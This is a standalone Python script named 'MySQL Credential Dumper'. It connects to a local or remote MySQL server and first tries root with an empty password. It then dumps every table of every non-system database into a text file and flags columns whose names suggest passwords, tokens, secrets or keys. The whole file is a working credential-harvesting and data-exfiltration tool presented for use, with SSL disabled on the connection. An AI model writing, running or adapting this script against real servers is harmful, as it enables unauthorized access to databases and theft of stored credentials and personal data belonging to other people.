#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import subprocess
import re
import os
import sys
import getpass

CRED_KEYWORDS = re.compile(r"(pass(word)?|pwd|secret|token|key|api|auth|cred)", re.I)

def run_mysql_query(host, port, user, password, query, database=None):
    """Run a MySQL query using the command-line client"""
    cmd = ["mysql","--skip-ssl", "-h", host, "-P", str(port), "-u", user]
    
    # Add password if provided
    if password:
        # Use environment variable for password to avoid it appearing in process list
        env = os.environ.copy()
        env["MYSQL_PWD"] = password
        use_env = True
    else:
        env = os.environ.copy()
        use_env = False
    
    # Add database if specified
    if database:
        cmd.extend(["-D", database])
    
    # Add query
    cmd.extend(["-e", query])
    
    # Add options for better output formatting
    cmd.extend(["--table"])
    
    try:
        # Run the command with older Python compatibility
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env if use_env else None
        )
        stdout, stderr = proc.communicate()
        
        # Convert bytes to string in Python 3
        if isinstance(stdout, bytes):
            stdout = stdout.decode('utf-8', errors='replace')
        if isinstance(stderr, bytes):
            stderr = stderr.decode('utf-8', errors='replace')
        
        if proc.returncode != 0:
            error = stderr.strip()
            return False, error
        
        return True, stdout.strip()
    except Exception as e:
        return False, str(e)

def dump_all_to_txt(host, port, user, password, out_file, include_system=False):
    print("[*] Connecting to MySQL at {}:{} as {}...".format(host, port, user))
    
    # Test connection
    success, result = run_mysql_query(host, port, user, password, "SELECT 'Connection successful';")
    if not success:
        print("[!] Connection failed: {}".format(result))
        return False
    
    print("[+] Connection successful!")
    
    # Get databases
    success, result = run_mysql_query(host, port, user, password, "SHOW DATABASES;")
    if not success:
        print("[!] Failed to list databases: {}".format(result))
        return False
    
    # Parse databases from output
    dbs = []
    for line in result.split('\n'):
        line = line.strip()
        if line and '|' in line and not line.startswith('+') and "Database" not in line:
            db_name = line.split('|')[1].strip()
            dbs.append(db_name)
    
    if not include_system:
        dbs = [db for db in dbs if db.lower() not in
               ("mysql", "information_schema", "performance_schema", "sys")]
    
    if not dbs:
        print("[!] No non-system databases found. Try --include-system to see system schemas.")
        return True
    
    print("[*] Found {} databases to dump: {}".format(len(dbs), ', '.join(dbs)))
    print("[*] Writing output to {}".format(out_file))
    
    with open(out_file, "w", encoding="utf-8") as f:
        for db in dbs:
            print("[*] Dumping database: {}".format(db))
            f.write("="*40 + "\nDATABASE: {}\n".format(db))
            
            # Get tables
            success, result = run_mysql_query(host, port, user, password, "SHOW TABLES FROM `{}`;".format(db))
            if not success:
                f.write("Error listing tables: {}\n".format(result))
                continue
            
            # Parse tables from output
            tables = []
            for line in result.split('\n'):
                line = line.strip()
                if line and '|' in line and not line.startswith('+') and "Tables_in" not in line:
                    table_name = line.split('|')[1].strip()
                    tables.append(table_name)
            
            if not tables:
                f.write("No tables found in this database.\n")
                continue
            
            for table in tables:
                f.write("\nTABLE: {}\n".format(table) + "-"*40 + "\n")
                
                # Get table data
                success, result = run_mysql_query(
                    host, port, user, password, 
                    "SELECT * FROM `{}`;".format(table), database=db
                )
                
                if not success:
                    f.write("[!] Error reading table {}.{}: {}\n".format(db, table, result))
                    continue
                
                # Write results to file
                f.write(result + "\n")
                
                # Get column names for credential detection
                success, cols_result = run_mysql_query(
                    host, port, user, password,
                    "SHOW COLUMNS FROM `{}`;".format(table), database=db
                )
                
                if success:
                    cols = []
                    for line in cols_result.split('\n'):
                        line = line.strip()
                        if line and '|' in line and not line.startswith('+') and "Field" not in line:
                            col_name = line.split('|')[1].strip()
                            cols.append(col_name)
                    
                    # Flag possible credential fields
                    suspect = [col for col in cols if CRED_KEYWORDS.search(col)]
                    if suspect:
                        f.write("\n[!] Possible credential fields: {}\n".format(', '.join(suspect)))
    
    print("[+] Dump complete. Output written to {}".format(out_file))
    return True

def interactive_login(host, port):
    """Handle interactive login if initial connection fails"""
    print("\n[*] Let's try to connect interactively.")
    
    # First, try root with no password
    print("[*] Trying 'root' with no password...")
    if dump_all_to_txt(host, port, "root", "", "mysql_dump.txt", False):
        return
    
    # If that fails, start interactive loop
    while True:
        choice = input("\n[?] Choose an option:\n1. Try root with password\n2. Try different username\n3. Quit\nChoice (1-3): ")
        
        if choice == '1':
            password = getpass.getpass("[?] Enter password for root: ")
            if dump_all_to_txt(host, port, "root", password, "mysql_dump.txt", False):
                return
        elif choice == '2':
            username = input("[?] Enter username: ")
            password = getpass.getpass("[?] Enter password for {}: ".format(username))
            if dump_all_to_txt(host, port, username, password, "mysql_dump.txt", False):
                return
        elif choice == '3':
            print("[*] Quitting...")
            sys.exit(0)
        else:
            print("[!] Invalid choice. Please try again.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MySQL Credential Dumper")
    connection_group = parser.add_mutually_exclusive_group(required=True)
    connection_group.add_argument("-l", "--local", action="store_true", help="Connect to local MySQL server")
    connection_group.add_argument("-r", "--remote", metavar="HOST[:PORT]", help="Connect to remote MySQL server")
    
    parser.add_argument("-u", "--user", help="MySQL username (optional, defaults to root)")
    parser.add_argument("-p", "--password", help="MySQL password (optional)")
    parser.add_argument("-o", "--out", default="mysql_dump.txt", help="Output .txt file path")
    parser.add_argument("--include-system", action="store_true", help="Include system schemas")
    
    args = parser.parse_args()
    
    # Determine host and port
    if args.local:
        host = "localhost"
        port = 3306
    else:
        # Handle remote connection with optional port
        if ":" in args.remote:
            host, port_str = args.remote.split(":", 1)
            try:
                port = int(port_str)
            except ValueError:
                print("[!] Invalid port: {}".format(port_str))
                sys.exit(1)
        else:
            host = args.remote
            port = 3306
    
    # Determine user and password
    user = args.user if args.user else "root"
    password = args.password if args.password else ""
    
    # Try to connect with provided credentials
    if not dump_all_to_txt(host, port, user, password, args.out, args.include_system):
        interactive_login(host, port)
